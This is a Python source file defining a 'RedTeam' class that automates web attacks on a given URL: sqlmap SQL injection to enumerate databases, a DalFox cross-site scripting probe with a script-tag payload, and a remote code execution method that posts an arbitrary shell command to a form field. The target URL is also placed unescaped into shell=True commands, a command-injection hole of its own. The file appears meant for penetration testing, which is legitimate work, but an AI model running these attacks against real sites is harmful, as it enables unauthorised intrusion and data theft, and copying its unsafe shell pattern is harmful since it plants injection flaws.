import subprocess
import requests
from log_manager import log_attack

class RedTeam:
    def sql_injection(self, target_url):
        """Launches an SQL Injection attack and logs a cleaner result."""
        command = f"sqlmap -u {target_url} --batch --dbs --forms --crawl=1"

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        log_output = []
        for line in process.stdout:
            clean_line = line.strip()
            if clean_line:
                print(clean_line)
                log_output.append(clean_line)

        process.wait()

        # Extract important info instead of logging everything
        filtered_output = [line for line in log_output if "Database" in line or "available databases" in line or "Type" in line or "Title" in line or "Payload" in line or "[*]" in line]
        result_output = "\n".join(filtered_output) if filtered_output else "[INFO] No databases found."

        log_attack("SQL Injection", target_url, result_output)
        return result_output


    def xss_attack(self, target_url):
        """Uses DalFox to test for XSS vulnerabilities."""
        try:
            command = f"dalfox url \"{target_url}?search='<script>alert('XSS')</script>\""
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            log_attack("XSS", target_url, result.stdout)
            return result.stdout if result.stdout else "[FAILED] No XSS vulnerabilities found."

        except Exception as e:
            return f"[ERROR] {str(e)}"


    def rce_attack(self, target_url, command="id"):
        """Attempts Remote Code Execution by sending a command to a vulnerable web form."""
        try:
            payload = {"cmd": command, "Submit": "Run"}  # Adjust form field names based on target
            response = requests.post(target_url, data=payload)

            if response.status_code == 200:
                result = response.text
            else:
                result = f"[FAILED] RCE failed with status {response.status_code}"

            log_attack("RCE", target_url, result)
            return result

        except Exception as e:
            return f"[ERROR] {str(e)}"

red_team = RedTeam()